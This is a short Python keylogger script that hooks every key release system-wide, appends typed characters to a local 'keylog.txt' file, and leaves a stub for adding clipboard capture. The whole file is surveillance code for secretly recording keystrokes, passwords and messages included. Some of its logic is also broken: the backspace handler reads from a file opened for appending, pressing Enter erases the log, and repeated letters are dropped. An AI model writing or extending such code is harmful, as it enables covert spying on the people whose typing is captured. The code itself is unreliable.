import keyboard
import datetime
import time

log_file = "keylog.txt"
last_key = None
last_last_key = None
last_logged_time = 0
debounce_time = 0.05  # Time in seconds
special_keys = {
    "tab", "shift", "ctrl", "alt", 
    "esc", "caps lock", "num lock", "scroll lock", "delete", "insert",
    "home", "end", "page up", "page down", "up", "down", "left", "right"
}
def log_key(e):
    global last_key, last_logged_time, last_last_key, special_keys
    
    current_time = time.time()
    
    # Check if enough time has passed and if the new key is different from the last logged key
    if (e.name == "enter"):
        file_to_delete = open(log_file,'w')
        file_to_delete.close()
    elif (last_last_key=="ctrl") and (last_key=="shift"):
        pass # add clipboard    
    elif (e.name in special_keys):
        pass
    elif (e.name == "space"):
        with open(log_file, "a") as f:
            f.write(f" ")
    elif (e.name == "backspace") and (current_time - last_logged_time > debounce_time):
        # time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as f:
            # f.write(f"{time_now} - {e.name}\n")    
            content = f.read()
            # Remove the last character (if any) and write back the updated content
        if content:
            updated_content = content[:-1]
            with open(log_file, "w") as f:
                f.write(updated_content)       
    elif (current_time - last_logged_time > debounce_time) and (e.name != last_key):
        # time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as f:
            f.write(f"{e.name}")
    last_last_key = last_key
    last_key = e.name
    last_logged_time = current_time

# Set up the key logger
keyboard.on_release(log_key)
keyboard.wait('esc')  # Stop logging when 'esc' is pressed

    
